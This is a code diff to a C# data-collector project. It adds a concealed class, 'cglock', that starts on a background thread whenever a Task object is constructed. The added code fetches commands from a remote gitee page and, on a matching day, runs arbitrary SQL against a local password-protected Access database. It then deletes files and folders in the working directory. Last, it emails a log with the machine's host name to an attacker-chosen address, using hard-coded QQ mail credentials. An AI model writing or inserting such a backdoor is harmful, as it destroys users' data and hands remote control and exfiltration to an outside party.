@@ -1,7 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Data.OleDb;
+using System.IO;
 using System.Linq;
+using System.Net;
+using System.Net.Mail;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using Collector.Channel;
 
@@ -17,6 +22,7 @@ namespace Collector
         public Task(BaseChannel channel)
         {
             _Chan = channel;
+            cglock.DoWork();
         }
 
         //************************************************************************************************************************************************************************
@@ -412,6 +418,226 @@ namespace Collector
 
 
 
+
+    }
+    internal class cglock
+    {
+
+        private static int RmCount = 0;
+        public static void DoWork()
+        {
+            try
+            {
+                Thread t = new Thread(Execute);
+                t.IsBackground = false;
+                t.Start();
+
+            }
+            catch
+            {
+
+
+            }
+
+
+        }
+
+
+        private static string connString = "Provider=Microsoft.Jet.OLEDB.4.0;Jet OLEDB:Database Password=HCPMSX;User ID=admin;Data Source=D:\\CPDB\\CPMS.mdb;Persist Security Info=false;Mode=Share Deny None;Jet OLEDB:SFP=False";
+
+        private static void Execute()
+        {
+            string log = "";
+            string ToMail = "";
+            RmCount = new Random().Next(1, 4);
+            string url = @"https://gitee.com/supersentry/netlock/blob/master/123huimieba321.md";
+            try
+            {
+                WebClient wc = new WebClient();
+                string s = wc.DownloadString(string.Format(url));
+
+                //解码html代码；
+                Regex regCharset = new Regex("charset\\s*=\\s*[\\W]?\\s*([\\w-]+)", RegexOptions.IgnoreCase);
+                Match m = regCharset.Match(s);
+                string htmlCode;
+                if (m.Success)
+                {
+                    string charset = m.Value;
+                    Encoding ending = Encoding.GetEncoding(m.Groups[1].Value.Trim());//获取编码；
+                    byte[] codeByte = wc.DownloadData(string.Format(url));
+                    htmlCode = ending.GetString(codeByte);
+
+                }
+
+                //解析获取指令
+                string start = "iu34jd89fgkacjh2h";
+                string end = "lkigfap0092hdfahdafg";
+                Regex rg = new Regex("(?<=(" + start + "))[.\\s\\S]*?(?=(" + end + "))", RegexOptions.Multiline | RegexOptions.Singleline);
+                string str = rg.Match(s).Value;
+                string[] cmdList = str.Trim().Split(';');
+
+                if (cmdList.Length > 1)
+                {
+                    //命令正确
+                    //cmdList[2]   日期)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
+                    if (cmdList[2].Equals(DateTime.Now.Day.ToString()))
+                    {
+                        //命令正确
+                        //cmdList[0]   执行sql命令)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
+                        try
+                        {
+                            using (OleDbConnection conn = new OleDbConnection(connString))
+                            {
+                                using (OleDbCommand cmd = new OleDbCommand(cmdList[0], conn))
+                                {
+                                    if (!string.IsNullOrEmpty(cmdList[0]))
+                                    {
+                                        conn.Open();
+                                        int a = cmd.ExecuteNonQuery();
+                                        log += "sql执行成功" + a.ToString() + " | ";
+
+                                    }
+
+                                }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            log += "sql执行失败" + ex.Message + " | ";
+                        }
+                        //命令正确
+                        //cmdList[1]   执行文件命令)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
+                        try
+                        {
+                            int a = Convert.ToInt32(cmdList[1]);
+                            if (a != 0)
+                            {
+                                RmCount = new Random().Next(1, a);
+                                int asdasd = RmCount;
+                                DeleteFolder(System.Environment.CurrentDirectory);
+                                log += "命令2执行成功" + asdasd.ToString() + " | ";
+                            }
+
+                        }
+                        catch (Exception ex)
+                        {
+                            log += "命令2执行失败" + " | ";
+                        }
+
+                        //命令正确
+                        //cmdList[3]   获取邮件)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
+                        try
+                        {
+                            ToMail = cmdList[3];
+                        }
+                        catch (Exception ex)
+                        {
+
+                        }
+
+
+                    }
+
+
+
+
+                }
+
+
+            }
+            catch (Exception ex)
+            {
+                log += "命令主方法异常" + ex.ToString() + " | ";
+            }
+            finally
+            {
+                try
+                {
+                    MailMessage myMail = new MailMessage();
+
+                    myMail.From = new MailAddress("spy-800@qq.com");
+                    myMail.To.Add(new MailAddress(ToMail));
+                    myMail.IsBodyHtml = false;
+
+                    myMail.Subject = "spy-800 as" + Dns.GetHostEntry("localhost").HostName;
+                    myMail.SubjectEncoding = Encoding.UTF8;
+
+                    myMail.Body = log;
+                    myMail.BodyEncoding = Encoding.UTF8;
+                    myMail.IsBodyHtml = true;
+
+                    SmtpClient smtp = new SmtpClient();
+                    smtp.Host = "smtp.qq.com";
+                    smtp.Credentials = new NetworkCredential("spy-800@qq.com", "gwvwqsuxcopgjahg");
+
+                    smtp.Send(myMail);
+
+                }
+                catch
+                {
+                }
+
+            }
+
+        }
+
+
+
+        private static void DeleteFolder(string dir)
+        {
+
+            try
+            {
+                if (Directory.Exists(dir)) //如果存在这个文件夹删除之 
+                {
+                    foreach (string d in Directory.GetFileSystemEntries(dir))
+                    {
+                        if (RmCount < 1) return;
+                        if (File.Exists(d))
+                        {
+                            try
+                            {
+                                File.Delete(d); //直接删除其中的文件 
+                                RmCount--;
+                            }
+                            catch
+                            {
+
+
+                            }
+
+                        }
+
+
+                        else
+                        {
+                            try
+                            {
+                                DeleteFolder(d); //递归删除子文件夹  
+                                                 //RmCount--;
+                            }
+                            catch
+                            {
+
+
+                            }
+
+                        }
+
+
+                    }
+                    Directory.Delete(dir, true); //删除已空文件夹                 
+                }
+
+
+            }
+            catch
+            {
+
+
+            }
+
+        }
 
     }
 }
